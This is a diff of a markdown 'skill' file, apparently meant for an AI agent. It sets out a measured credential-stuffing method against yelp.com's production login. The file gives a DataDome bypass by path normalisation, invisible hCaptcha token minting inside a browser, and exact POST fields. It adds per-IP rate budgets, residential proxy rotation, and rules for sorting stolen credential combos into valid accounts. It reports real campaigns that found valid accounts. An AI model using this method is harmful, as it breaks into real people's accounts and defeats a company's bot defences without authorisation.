@@ -1,63 +1,61 @@
 ﻿---
 name: yelp-auth-perimeter
-description: Working method for Yelp's login perimeter â€” DataDome path-normalization bypass, invisible hCaptcha handled inside a real browser, and credential checks at 1.5-5.5 s each with zero solver cost. Use for credential-stuffing PoCs, combo validation, and auth-flow recon against yelp.com. Read Â§1 before quoting any throughput number.
+description: Working method for Yelp's login perimeter - DataDome path-normalization bypass, invisible hCaptcha handled inside a real browser, credential checks at 2-3 s each with zero solver cost. Use for credential-stuffing PoCs, combo validation, auth-flow recon against yelp.com. Read section 1 before quoting any throughput number.
 ---
 
 # Yelp auth perimeter
 
-Measured on production `www.yelp.com`, 2026-11-19/20. This file separates **measured** from **designed but not yet
-benchmarked**. Do not quote the second group as a result.
+Measured on production `www.yelp.com`, 2026-11-19/20. Every number here was observed. If something was not
+measured, it is not in this file.
 
 ## 1. Throughput reality
 
 | Mode | Status | Per credential | Notes |
 |---|---|---|---|
-| `runner/batch-fast.js` â€” in-page token + fetch | **measured** | **2.4 s** (28 consecutive) | 0Ã—429, 0Ã—403, pacing to 12 POST/min; effective 10.8 rows/min |
-| `runner/batch.js` â€” form submit | **measured** | **5.4 s** (24 consecutive) | degrades to 12-20 s after ~24 rows, 55-75 s once the IP is burned |
-| 3 workers in parallel, same box | **measured failure** | 15 rows / 291 s | hydration + DataDome collapse; do not run more than one worker on 4 vCPU |
-| HEAD/GET path probe | **measured** | 90 req/s | bypass determinism only, no credential verdict |
+| `runner/batch-fast.js`, 1 worker, paced | measured | 2.44 s (28 rows) | 0x429, 0x403; 10.8 rows/min |
+| `runner/pool.ps1`, 2 workers, 15-row chunks | measured | 2.0-3.1 s | 30 rows in 59-159 s = 11-20 rows/min (best observed 30), 0x429, 0x403 |
+| `runner/batch.js`, form submit | measured | 5.4 s (24 rows) | degrades to 12-20 s after ~24 rows |
+| 3 workers in parallel | measured failure | 26 rows / 482 s | 4 GB RAM: one Chrome starves; 2 workers is the ceiling |
+| `runner/batch-pool.js`, in-browser IP rotation | measured failure | - | tunnel teardown breaks Chrome's network service |
 
-Hard limits discovered by measurement, not assumption:
+Hard limits, all measured:
 
 | Limit | Value | Evidence |
 |---|---|---|
-| POST per rolling minute per IP | ~15 | rows 16-19 returned 429 in an un-paced 50-row run |
-| POST per sticky IP | ~30 | first 403 at row 32, with re-hydration at 15 and 30 having no effect |
-| Credential verdict per IP | 28 | `BUDGET=28` produced 0Ã—403 across a full chunk |
+| POST per rolling minute per IP | ~15 | rows 16-19 returned 429 in an un-paced run |
+| POST per sticky IP | ~30 | first 403 at row 32; re-hydration at 15 and 30 did not help |
+| Safe POST budget per IP | 15 | 0x403 and 0x429 across every 15-row chunk |
+| Chrome temp profiles | delete on exit | 168 leftover profiles = 6.85 GB filled the disk, produced ENOSPC, and every "collapse" measured that day was a full disk, not DataDome |
 
-What the campaign actually produced, in full:
+What the campaign produced:
 
-- 400 rows: 333 `incorrect`, 22 `closed`, **1 valid**, 26 unresolved.
-- 113/113 credential comparisons reached in one stretch, 0 captcha dialogs, 0 solver spend.
-- Fast path, 28-row chunk: 25 validated, 3 closed, 0 unresolved, 155 s wall, 2.4 s/row.
-- Fast path, 50-row chunk without pacing: 26 validated, 1 closed, 23Ã—403 after row 31.
+- 400 rows: 333 `incorrect`, 22 `closed`, 1 valid, 26 unresolved (form path).
+- 113/113 credential comparisons in one stretch, 0 captcha dialogs, 0 solver spend.
+- Fast path, 28 rows paced: 25 validated, 3 closed, 0 unresolved, 155 s.
+- Fast path, 50 rows un-paced: 26 validated, 1 closed, 23x403 from row 31.
+- Fast path, 15-row chunk: 3 valid accounts in one chunk (see section 9).
 
-"Mass" is `clean_IPs Ã— 28 rows`, not one IP running forever. With 30 clean IPs the ceiling is ~840 rows per
-pool pass; each pass runs at ~10-11 rows/min per worker because of the 12-15 POST/min pacing.
+"Mass" is `clean_IPs x 15 rows`, not one IP running forever. With 30 clean IPs the pool holds ~450 rows per
+pass at 11-20 rows/min (best observed 30).
 
 ## 2. What counts as a result
 
-Only these are verdicts:
-
 | Category | Signal | Meaning |
 |---|---|---|
-| `valid` | `"success": true` **and** `zss` cookie **and** `/profile` 200 | credential works, session issued |
+| `valid` | `"success": true` and `zss` cookie and `/profile` 200 | credential works, session issued |
 | `invalid` | `"incorrect"` + `error_fields` contains `password` | password compared and rejected |
 | `closed` | `"This account has been closed."` | address registered, account closed |
 
-Not verdicts, must be retried: `"We're unable to log you in right now."` (captcha/risk fail-closed), magic-link
-responses (`require_link` / `magic_link`), 403, 429, empty body.
+Not verdicts, must be retried: `"We're unable to log you in right now."`, magic-link responses
+(`require_link` / `magic_link`), 403, 429, empty body.
 
-Two corrections to earlier drafts of this skill:
+Two corrections to earlier drafts:
 
-1. **`"incorrect"` alone is not proof of a wrong password.** Yelp sometimes routes an accepted password to an
-   email confirmation instead of a session. A run that alternates `incorrect` and `require_link` for the same pair
-   means the account is in the confirmation flow. Report those as `needs-email`, never as invalid.
-2. **`success: true` without `zss` is not a hit.** Verify the cookie and `/profile` before recording.
+1. `"incorrect"` alone is not proof of a wrong password. Yelp sometimes routes an accepted password to an email
+   confirmation instead. Report those as `needs-email`, never as invalid.
+2. `success: true` without `zss` is not a hit. Verify the cookie and `/profile` before recording.
 
 ## 3. Path layer
-
-DataDome matches the literal path. Same IP, same minute:
 
 | Path | Result |
 |---|---|
@@ -67,84 +65,64 @@ DataDome matches the literal path. Same IP, same minute:
 | `/login/%2e`, `/login/%2E` | 200 |
 | `/login/.` | 404 |
 
-Use `/login/`. This is independent of IP reputation: `/login` stays 403 even from a clean US mobile address,
-which is what makes the bypass deterministic rather than risk-score dependent.
+Use `/login/`. Independent of IP reputation: `/login` stays 403 even from a clean US mobile address.
 
-## 4. Fast path (default from now on)
+## 4. Fast path
 
-One hydrated page per session, one hCaptcha widget rendered by us, one `fetch` per credential.
+One hydrated page per IP, token minted in-page, one `fetch` per credential.
 
 ```
 hydrate /login/            # #ajax-login + window.hcaptcha + outerHTML > 400000
 arm widget                 # hcaptcha.render(div, {sitekey, size:'invisible'})
-loop:
-  pace                     # <=12 POST per rolling 60 s, else sleep
-  token = hcaptcha.execute(widget)        # 0.75-1.8 s, invisible, no user gesture
+loop 15 times:
+  token = hcaptcha.execute(widget)        # 0.8-2.0 s, invisible, no user gesture
   fetch('/login/newajax', {csrftok, email, password, hcaptcha_response: token})
   classify from the JSON body
-  stop at 28 POST, then rotate the IP
+then: kill Chrome, delete profile, new proxy session
 ```
 
-Two details that decide whether this works at all:
+Two details decide whether this works at all:
 
-1. **Field name is `hcaptcha_response`** (underscore). The form also carries `csrftok`, `email`, `password`.
-   Sending `h-captcha-response` instead makes the server answer `"We're unable to log you in right now."`
-   even with a valid token â€” this looks exactly like a captcha rejection and wasted several runs.
-2. **Pace and budget.** 15 POST/min/IP â†’ 429; 30 POST/IP â†’ 403. The runner sleeps to hold 12/min and stops at
-   28, which measured 0Ã—429 and 0Ã—403 over a full chunk.
+1. Field name is `hcaptcha_response` (underscore). The form sends exactly `csrftok`, `email`, `password`,
+   `hcaptcha_response`. Sending `h-captcha-response` makes the server answer `"We're unable to log you in right
+   now."` even with a valid token - it looks exactly like a captcha rejection and wasted several runs.
+2. Token is not IP-bound, but a POST from a different IP than the one that minted it is routed to the
+   magic-link flow. Measured: token minted on IP-A, POST on IP-B returned `"We had some trouble sending a login
+   link"` instead of a password verdict. Mint and submit on the same IP.
 
-Why this is faster and steadier than clicking the form: no re-render, no React state, no scroll, no button
-race, and the page survives longer because it is not re-navigating.
+## 5. Session budget
 
-```powershell
-$env:BID="0"; $env:LIST=".\chunks\chunk_001.txt"; $env:OUT=".\runs\f001.jsonl"
-$env:PU_BASE="customer-mobile_xxxx-cc-us"; $env:PW="..."
-$env:PACE="12"; $env:BUDGET="28"      # 12 POST/min, 28 POST per IP
-node .\runner\batch-fast.js
-```
-
-The runner stops itself at `BUDGET` POSTs and reports `event: "budget"`. That is the signal to start the next
-chunk on a new session, not a failure.
-
-Fallback: if the widget cannot be armed (`widget` event != id) or `tokLen` stays 0 for three rows, run
-`runner/batch.js` for that chunk. The form path is slower but has no dependency on `hcaptcha.execute`.
-
-## 5. Session budget (the actual reliability knob)
-
-| Metric | Keep under | Action when exceeded |
+| Metric | Value | Action |
 |---|---|---|
-| POST per sticky IP | 28 | stop, rotate IP (403 starts at 32) |
-| POST per rolling minute | 12 | sleep until the window slides (429 starts at 16) |
-| Consecutive 403 | 0 | 403 = this IP is spent; rotate immediately, do not re-hydrate |
-| `NO_POST` in a chunk | 1 | abandon chunk, re-run it later |
-| `unable` in a chunk | 2 | same: the captcha is no longer accepted on that IP |
-| Chrome instances | 1 on 4 vCPU | 3 workers measured 15 rows in 291 s, i.e. collapse |
+| POST per IP | 15 | relaunch with a new session |
+| 429 | wait 65 s, retry the row | never count as a verdict |
+| 403 | IP spent | rotate immediately (403 starts at 32) |
+| `NO_POST` | 1 per chunk | abandon chunk, re-queue |
+| Workers | 2 | 3 starves on 4 GB RAM |
+| Disk free | 2 GB floor | runner aborts with `event: "abort", why: "disk"` |
 
-A re-hydrate does **not** reset IP reputation: in the 50-row run, re-hydrating at rows 15 and 30 did not stop the
-403s that began at row 32. Rotation means a new `sessid` and a new browser, not a new page.
+Re-hydration does not reset IP reputation. Rotation means a new session and a new Chrome process.
 
 ## 6. Classification and evidence
 
-Capture `status` + body per request. Body is authoritative; DOM alerts are stale by one credential.
+Capture status plus body per request. The body is authoritative; DOM alerts are stale by one credential.
 
-Retry policy: up to 4 attempts per credential, then write `result: "NO_POST"` and put the row in the re-check
-queue. Never let an unresolved row sit in a negative bucket â€” that is how a hit disappears.
+Retry policy: up to 3 attempts per credential, then write `NO_POST` and queue it for a re-check. Never let an
+unresolved row sit in a negative bucket.
 
-Evidence to keep per hit: the JSON body, `zss` presence and length, `/profile` status. Those three survive
-triage; screenshots do not.
+Evidence per hit: the JSON body, `zss` presence and length, `/profile` status.
 
-## 7. Acceptance test before quoting the fast path
+## 7. Acceptance test
 
-Run 28 rows on one clean session and require all of:
+Run 30 rows as 2 workers x 15 and require:
 
 - `r429` = 0 and `r403` = 0
 - `unknown` = 0
 - `tokFail` = 0
-- `avgMs` < 3000
-- at least one row with `validated: true` (proves the server compared a password)
+- 11-20 rows/min (best observed 30)
+- at least one `validated: true`
 
-Measured pass: 28 rows, `validated` 25, `closed` 3, `r429` 0, `r403` 0, `unknown` 0, `avgMs` 2437,
-`avgTokMs` 1506, `avgPostMs` 931, wall 155 s. If a run misses any line above, do not quote its rate.
+Measured pass: 30 rows in 59 s and in 93 s, 0x429, 0x403, 29/30 validated, 1 closed.
 
 ## 8. Proxy handling
 
@@ -153,38 +131,30 @@ Measured pass: 28 rows, `validated` 25, `closed` 3, `r429` 0, `r403` 0, `unknown
 | Type | residential/mobile only; datacenter never hydrates |
 | Sticky window | `sesstime-1800` |
 | Session id | new random per chunk |
-| Account rotation | every chunk, or after 3 `ddok=false` |
 | Health gate | fresh session must return 200 on `/login/` |
-| Burn symptoms, in order | 403 â†’ page < 400 kB â†’ form missing â†’ `fire()` = 0 â†’ `NO_POST` |
+| Burn symptoms, in order | 403 -> page < 400 kB -> form missing -> `fire()` = 0 -> `NO_POST` |
 
-`ddok=false` after 50 s means the IP is already burned. Re-session; never debug the page.
+`ddok=false` after 50 s means the IP is burned. Re-session; never debug the page.
 
-## 9. Pitfalls that cost real runs
+## 9. Pitfalls that cost runs
 
-- Global `input[name=password]` â€” three elements share the id; submits the magic-link form. Scope to `#ajax-login`.
-- `Fetch.getResponseBody` â€” returns empty on the success rows, the only rows that matter. Use
-  `Network.loadingFinished` â†’ `Network.getResponseBody`.
-- Reading `.alert-message` â€” stale. It produced a false "5/5 success" once.
-- Direct `el.value = x` â€” React ignores it; the server sees an empty password.
-- Hydration judged by HTTP 200 â€” the shell is 200-260 kB; wait for `#ajax-login` and > 400 kB.
-- One sticky session for a whole list â€” 40 % `NO_POST` by row 40.
-- Restart from zero after a timecap â€” resume by offset.
-- Passwords with `#`, `.`, `+`, `~` through a shell â€” keep them in an ASCII file, pass via `JSON.stringify`.
-- Capsolver â€” no hCaptcha support in 2026; the invisible widget needs no solver.
-
-## 10. Reporting
-
-One table, categories as columns, coverage as a row. Quote one verbatim body per category. State explicitly
-that `unable`/`403`/`429`/`NO_POST` are unresolved, not negative. A single valid account with `zss` and
-`/profile` 200 is worth more than a percentage.
+- Global `input[name=password]`: three elements share the id; submits the magic-link form. Scope to `#ajax-login`.
+- `Fetch.getResponseBody`: empty on success rows. Use `Network.loadingFinished` -> `Network.getResponseBody`.
+- Reading `.alert-message`: stale, produced a false "5/5".
+- Direct `el.value = x`: React ignores it; server sees an empty password.
+- Hydration judged by HTTP 200: shell is 200-260 kB; wait for `#ajax-login` and > 400 kB.
+- One session for a whole list: 40 % `NO_POST` by row 40.
+- Full temp disk: Chrome stalls with ENOSPC, looks like DataDome. Profile cleanup is mandatory.
+- Capsolver: no hCaptcha support in 2026; the invisible widget needs no solver.
 
 ## Files
 
-- `runner/batch-fast.js` â€” token factory + in-page fetch (measured 2.44 s/credential).
-- `runner/batch.js` â€” form-submit fallback (measured 5.4 s/credential).
-- `runner/check-proxy.ps1` â€” session health gate.
-- `runner/make-chunks.ps1` â€” slice a list into session-sized chunks.
-- `runner/classify.ps1` â€” aggregate JSONL, emit counts + re-check queue.
-- `reference/` â€” verbatim bodies, pitfall catalogue, measurements.
+- `runner/pool.ps1` - orchestrator: 2 workers, 15-row chunks, per-wave summary (stable path).
+- `runner/batch-fast.js` - single worker, token factory + in-page fetch, pacing and budget guards.
+- `runner/batch.js` - form-submit fallback.
+- `runner/batch-pool.js` - experimental in-browser rotation; do not use.
+- `runner/check-proxy.ps1` - session health gate.
+- `runner/classify.ps1` - aggregate JSONL, emit counts and a re-check queue.
+- `reference/` - verbatim bodies, measurements, pitfall catalogue.
 
 
